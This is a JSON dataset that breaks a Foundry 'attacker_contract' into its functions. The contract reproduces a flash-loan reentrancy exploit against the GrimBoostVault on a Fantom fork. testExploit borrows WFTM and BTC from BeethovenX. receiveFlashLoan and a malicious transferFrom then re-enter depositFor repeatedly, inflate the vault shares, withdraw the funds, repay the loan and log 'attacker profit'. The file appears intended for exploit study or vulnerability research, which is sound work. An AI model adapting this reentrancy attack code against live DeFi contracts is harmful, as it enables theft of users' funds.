[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) public {\n        // Add Liquidity to SpiritSwap\n        wftm.approve(routerAddress, wftmLoanAmount);\n        btc.approve(routerAddress, btcLoanAmount);\n        router.addLiquidity(\n            btcAddress, wftmAddress, btcLoanAmount, wftmLoanAmount, 0, 0, address(this), block.timestamp\n        );\n\n        // Call depositFor() in GrimBoostVault, reentrancy to this.transferFrom\n        btc_wftm.approve(grimBoostVaultAddress, 2 ** 256 - 1);\n        lpBalance = btc_wftm.balanceOf(address(this));\n        grimBoostVault.depositFor(address(this), lpBalance, address(this));\n\n        // Withdraw LPs from GrimBoostVault\n        grimBoostVault.withdrawAll();\n\n        // Remove Liquidity from SpiritSwap\n        lpBalance = btc_wftm.balanceOf(address(this));\n        btc_wftm.transfer(btc_wftm_address, lpBalance);\n        btc_wftm.burn(address(this));\n\n        //Repay Flash Loan\n        for (uint256 i = 0; i < tokens.length; ++i) {\n            IERC20 _token = tokens[i];\n            uint256 _amount = amounts[i];\n            uint256 _feeAmount = feeAmounts[i];\n            _token.transfer(beethovenVaultAddress, (_amount + _feeAmount));\n        }\n\n        emit log_named_uint(\"WFTM attacker profit\", wftm.balanceOf(address(this)) / 1e18);\n\n        emit log_named_uint(\"BTC attacker profit\", btc.balanceOf(address(this)) / 1e8);\n    }\n\n    // Called by the reentrancy vulnerability in grimBoostVault.depositFor()\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"fantom\", 25_345_002); //fork fantom at block 25345002\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        //Flash Loan WFTM and \"BTC\" frm BeethovenX\n        IERC20[] memory loanTokens = new IERC20[](2);\n        loanTokens[0] = wftm;\n        loanTokens[1] = btc;\n        uint256[] memory loanAmounts = new uint256[](2);\n        loanAmounts[0] = wftmLoanAmount;\n        loanAmounts[1] = btcLoanAmount;\n        beethovenVault.flashLoan(IFlashLoanRecipient(address(this)), loanTokens, loanAmounts, \"0x\");\n    }\n\n    // Called after receiving Flash Loan Funds\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address _from, address _to, uint256 _value) public {\n        reentrancySteps -= 1;\n        if (reentrancySteps > 0) {\n            //Call depositFor() in GrimBoostVault with token==ATTACKER, user==ATTACKER\n            grimBoostVault.depositFor(address(this), lpBalance, address(this));\n        } else {\n            //In the last step on reentrancy call depositFor() with token==SPIRIT-LP, user==ATTACKER\n            grimBoostVault.depositFor(btc_wftm_address, lpBalance, address(this));\n        }\n",
    "description": ""
  }
]